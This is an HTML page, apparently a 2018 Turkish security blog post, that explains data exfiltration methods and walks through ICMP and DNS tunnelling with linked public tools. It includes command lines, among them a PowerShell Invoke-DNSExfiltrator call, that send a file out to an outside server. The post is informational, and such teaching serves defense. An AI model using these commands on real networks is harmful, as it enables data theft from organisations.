@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<!--[if lt IE 7]>      <html class="no-js lt-ie9 lt-ie8 lt-ie7"> <![endif]-->
+<!--[if IE 7]>         <html class="no-js lt-ie9 lt-ie8"> <![endif]-->
+<!--[if IE 8]>         <html class="no-js lt-ie9"> <![endif]-->
+<!--[if gt IE 8]><!--> <html class="no-js"> <!--<![endif]-->
+    <head>
+        <meta charset="utf-8">
+        <title>    Data Exfiltration
+</title>
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        
+        <link rel="stylesheet" href="theme/css/cid.css">
+        <link href="https://enesergun.net/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="Enes Ergün Atom Feed" />
+        <style>
+                
+
+        pre {
+            font-family: "", "Lucida Console", monospace, Monaco;
+            font-size: 14px;
+            line-height: 1.0;
+        }
+
+        a {
+            color: #da4b6d;
+            text-decoration: none;
+        }
+
+        w {
+            color: white;
+        }
+
+        e {
+            color: #93ffd7;
+        }
+
+        /* green  */
+        k {
+            color: #ff93f1;
+        }
+
+        /* pink   */
+        l {
+            color: #f1ff93;
+        }
+
+        /* yellow */
+        o {
+            color: #93f1ff;
+        }
+
+        /* blue   */
+        r {
+            color: #fa4d57;
+        }
+
+        /* red    */
+
+        body {
+            font-family: "", "Lucida Console", monospace, Monaco
+        }
+
+        h1 {
+            color: #da4b6d !important;
+        }
+
+        .blog-header {
+            text-align: center;
+        }
+
+        header[role="banner"] {
+            #logo-main {
+                display: block;
+                margin: 20px auto;
+            }
+        }
+
+        #navbar-primary.navbar-default {
+            background: transparent;
+            border: none;
+
+            text-align: center;
+            display: inline-block;
+            float: none;
+            padding-left: 30px;
+            padding-right: 30px;
+            width: 100%;
+            border-style: groove;
+            border-color: #ff93f1;
+        }
+        </style>
+    </head>
+    <body>
+        <!--[if lt IE 7]>
+            <p class="chromeframe">You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/">upgrade your browser</a> or <a href="http://www.google.com/chromeframe/?redirect=true">activate Google Chrome Frame</a> to improve your experience.</p>
+        <![endif]-->
+
+            <div class="container">
+
+<header class="blog-header">
+    <h1><a href="https://enesergun.net" class="glitch" data-text="Enes Ergün">Enes Ergün</a></h1>
+    <p> Personel homepage </p>
+    <nav>
+        <a href="https://enesergun.net/">INDEX</a>
+        <a href="https://enesergun.net/archives">ARCHIVES</a>
+        <a href="https://enesergun.net/categories">CATEGORIES</a>
+    </nav>
+</header>
+
+    <div class="post">
+
+        <header>
+            <h1>Data Exfiltration</h1>
+            <p class="date">Written on <time datetime="2018-11-11T13:48:00+03:00">Nov 11, 2018</time></p>
+            
+        </header>
+
+        <article>
+            <h2>Data Exfiltration Nedir?</h2>
+<p>Bir kişi veya grubun yetkisiz bir biçimde bir veriyi başka bir bilgisayar yada sunucuya kopyalaması, transfer etmesi anlamına gelir. Data extrusion(veri çıkarma), data exportation(veri ihracati!), data theft(veri hırsızlığı) olarak da bilinir.</p>
+<p>Örnek vermek gerekirse bir banka çalışanının bankaya ait verileri bir USB(!) içerisinde dışarıya çıkartması bir suçtur. Fakat işler her zaman bu şekilde USB gibi şeyler ile de olmamaktadır. Bazen veri kaçırmayı tanımlamak çok zor hale gelebilmektedir. Farklı yöntemleri vardır.</p>
+<p>Bu yazıda sizlere yöntemlerinden kısaca bahsedeceğim.</p>
+<h2>Basit Yöntemler</h2>
+<h3>E-Posta</h3>
+<p>Aklımıza gelebilecek en kolay çözüm bir veriyi kaçırmak istersek bunu eposta ile gönderebilir ve karşı tarafta indirerek işlem tamamlanmış olabilir. Fakat burada engelleme adına Email gatewayler karşımıza çıkmaktadır. Email gatewayler temel olarak mail içerisinde zararlı var mı diye kontrol eder fakat içerisinde data kaçırmaya karşı modüllerde bulunmaktadır. Tabi burada Titus gibi yazılımlar ile birlikte datanın sınıflandırması, arkaplanda bunların loglarının tutulması da bir engel olarak görülebilir.</p>
+<p><code>Parola korumalı bir sıkıştırılmış dosyayı nasıl farkedeceklerini bilmiyorum. Ama farkedemeyeceklerini düşünüyorum.</code></p>
+<h3>Cihazlara Yüklemek</h3>
+<p>Günümüzde yanımızda bir çok akıllı cihaz taşıyoruz. Bu kısımda kurum içerisinde ki bir datayı kaçırmak isteyen kişinin telefonuna, taşınabilir diskine, laptop kullanılıyorsa bluetooth ile telefonuna atması işten bile değildir. Hatta günümüzde web.whatsapp gibi bir arayüz ile whatsapp üzerinden bile kaçırılabilir.</p>
+<p><code>Bu kısım sıkı bir takip istemekte birlikte nasıl engellenebileceği konusunda bir yorumum dahi bulunmamaktadır.</code></p>
+<h2>Teknik Yöntemler</h2>
+<p>Bu kısımda data exfiltration kısmında karşımıza bir çok yöntem çıkmakta tabi ki teknik zorlukları da bulunmaktadır. </p>
+<h3>FTP&amp;SFTP</h3>
+<p>Aslında çokta teknik olmayan bir konudur. Uzaktaki bir sunucuya FTP&amp;SFTP servis kurulur ve veriler bu servisler aracılığı ile dışarıya çıkartılabilir.</p>
+<p>Önlemek için giden trafiği inceleyecek güvenlik cihazları/yazılımları yeterli olacaktır. Trafik içerisinde gönderilen trafik boyutuda önemli bir faktördür tabi ki. Zaten çoğu güvenlik ürünü anomaly'i farkedecektir.</p>
+<h3>HTTP Methodları ile Göndermek</h3>
+<p>Bu kısımda çok teknik bir konu değildir aslında. Basit bir Web Servis yazıp bu web servise bir form koyup buradan gelecek tüm verinin arkaplanda ayrı ayrı yazıldığını düşünürseniz gayet kolaydır. Hatta çıkartılacak veriyi binary code çevirip basarsanız ve arkaplanda tekrar eski haline çevirirseniz ihtiyaçlarınızı karşılayacaktır.</p>
+<h2></h2>
+<p><strong>Asıl Bahsetmek İstediğim Kısıma Gelelim</strong></p>
+<p>Bu kısımdan önceki yazılar tamamen genel anlamda nasıl olduğundan bahsetmek amacıylaydı.</p>
+<p>Bu kısımda daha önce karşıma çıkmış olan 2 adet yöntemden bahsedeceğim, zaten yazının ana konusu bu 2 yöntemdir.</p>
+<h3>ICMP Data Exfiltration</h3>
+<p>ICMP protokolü kullanılarak yapılan yöntemdir. Yani genel anlamda bizim bildiğimiz ping komutu ile birlikte yapılan işlemlerdir. ICMP protokolü içerisinde çok fazla data veya bilgi barındırmaz basit yapıda bir protokoldür bu sebeple data exfiltration işlemleri yavaş ilerleyecektir. Kişiler ICMP Echo Requestler içerisinde göndermek istedikleri datanın binary halini atarak dışarıya veri sızdırabilmektedirler.</p>
+<p>ICMP Paketlerinin boyutu 74 bytedır. Data exfiltration kısmında genellikle 100 byte ile 542 byte arasını geçmemektedir.</p>
+<p><code>Engellemek adına yeni nesil tüm cihazlar bozuk ICMP paketlerini tespit edebilecek seviyededirler.</code></p>
+<h4>Nasıl Yapılır?</h4>
+<p><a href="https://github.com/martinoj2009/ICMPExfil">ICMPExfil</a></p>
+<p>Yukarıda vermiş olduğum linkteki araç ile ping.py ve server.py dosyaları kullanılarak bu işlem gerçekleştirilebilir.</p>
+<p><code>ping.py --ip PINGATACAGINIZSERVER --asciiFile göndereceğinizdosya</code></p>
+<h3>DNS Data Exfiltration</h3>
+<p>DNS üzerinden data exfiltration yapmaya yarar. DNS'in çalışma mantığını kullanır. 
+Nedir DNS'in çalışma mantığı?</p>
+<p>Gitmek istediğimiz bir domain'e ait olan IP'yi dünya üzerindeki veya bizim kendi networkümüzde bulunan bir DNS sunucuya sorar. DNS sunucuda kendisinde var ise bu domaine ait olan IP'yi geri döndürür ve site girmiş olursunuz, eğer yoksa sormuş olduğunuz dns servisi bir üst makama gidip root dns sunucularına sorar ve size de bu şekilde elçilik yapmış olur.</p>
+<p>Bu kısımda data exfiltration için DNS sorgusu içerisinde ki CNAME ve TXT kayıtları kullanılmaktadır. Bu sayede paket içerisine yapısal olmayan bir çok veri koyulabilmektedir. </p>
+<h4>Nasıl Yapılır</h4>
+<p><a href="https://github.com/Arno0x/DNSExfiltrator">DNS Exfiltrator</a></p>
+<p>Bu kısımda kendinize ait bir sunucunuz olması gerekmektedir. Yukarıda vermiş olduğum link içerisinden dnsefiltrator.py dosyasını belirli argümanlarla çalıştırmanız gerekmektedir. Yazılım defaultta RC4 şifreleme yapmaktadır bu sebeple argüman olarak vermiş olduğunuz parola oldukça önemlidir.</p>
+<p>Server üzerinde 
+<code>dnsexfiltrator.py -d domain -p PAROLA</code></p>
+<p>Client üzerinde</p>
+<div class="highlight"><pre><span></span><code>c:\DNSExfiltrator&gt; powershell
+PS c:\DNSExfiltrator&gt; Import-Module .\Invoke-DNSExfiltrator.ps1
+PS c:\DNSExfiltrator&gt; Invoke-DNSExfiltrator -i inputFile -d mydomain.com -p password -s my.dns.server.com -t 500
+</code></pre></div>
+
+<ul>
+<li>-i argümanı ile göndermek istediğiniz dosya </li>
+<li>-d argümanı ile server kısmında belirlemiş olduğunuz domainismi </li>
+<li>-p kısmı ile server kısmında belirtmiş olduğunuz encrytion için kullanılacak parola </li>
+<li>-s kısmında ise sunucunuzun IP adresi </li>
+<li>-t kısmında ise throttleTime yani DNS sorguları arasında geçecek süreyi girmeniz gerekmektedir.(MS)</li>
+</ul>
+<p>Dilerseniz -h parametresini kullanarak Google, CF gibi HTTP üzerinden DNS servislerinide kullanabilirsiniz.</p>
+<p>Yazıyı burada sonlandırıyorum. Daha detaylı bilgilere ulaşmak veya daha fazla teknik okumak/görmek isterseniz aşağıdaki linki kullanabilirsiniz.</p>
+<p><a href="https://www.pentestpartners.com/security-blog/data-exfiltration-techniques/">Data Exfiltration Techniques</a></p>
+<p><strong>Burada anlatılanlar hakkında yaptığınız,yapacağınız tüm işlemlerden sizler sorumlusunuz. Mesuliyet kabul edilmemektedir.</strong></p>
+<p><strong>Bu yazı tamamen bilgilendirme amaçlıdır.</strong></p>
+<p>Her yazının sonunda olduğu gibi klasik bu yazının şarkısını paylaşıyorum. </p>
+<p><a href="https://www.youtube.com/watch?v=DuDhiHSksaA"><img alt="Beth Hart - Caught Out In The Rain" src="https://img.youtube.com/vi/DuDhiHSksaA/0.jpg"></a></p>
+        </article>
+
+        <footer>
+            <p>This entry is posted in <a href="https://enesergun.net/category/siber-guvenlik.html">siber güvenlik</a>.</p>
+        </footer>
+
+<div class="comments">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        var disqus_shortname = '0x656e';
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+    </div>
+
+
+<footer class="blog-footer">
+
+    <ul class="nav">
+            <li><a href="https://devilinside.me/"> Eşelyon</a></li>
+            <li><a href="https://medium.com/@brkalbyrk"> Berk Albayrak</a></li>
+            <li><a href="https://ahmtglr.wordpress.com/"> Ahmet Güler</a></li>
+            <li><a href="https://kaganisildak.com/"> Kağan Işıldak</a></li>
+            <li><a href="https://eybisi.run/"> Eybisi</a></li>
+            <li><a href="https://onur.im/"> Onur Aslan</a></li>
+            <li><a href="https://canyoupwn.me/"> Canyoupwn.me</a></li>
+            <li><a href="http://www.oguzozkeroglu.com"> Oğuz Özkeroğlu</a></li>
+            <li><a href="https://aligoren.com"> Ali Gören</a></li>
+            <li><a href="https://0xf61.gitlab.io/"> Emir Kurt</a></li>
+<br>
+            <li><a href="www.twitter.com/eness_ergun">Twitter</a></li>
+            <li><a href="info@enesergun.net">Mail</a></li>
+    </ul>
+
+    <p class="disclaimer">
+    Built with <a href="http://getpelican.com">Pelican</a>, and <a href="https://github.com/hdra/Pelican-Cid">Cid</a> theme.
+    </p>
+</footer>
+            </div>
+<script>
+    var _gaq=[['_setAccount','UA-44262671-1'],['_trackPageview']];
+    (function(d,t){var g=d.createElement(t),s=d.getElementsByTagName(t)[0];
+    g.src=('https:'==location.protocol?'//ssl':'//www')+'.google-analytics.com/ga.js';
+    s.parentNode.insertBefore(g,s)}(document,'script'));
+</script>
+    </body>
+</html>
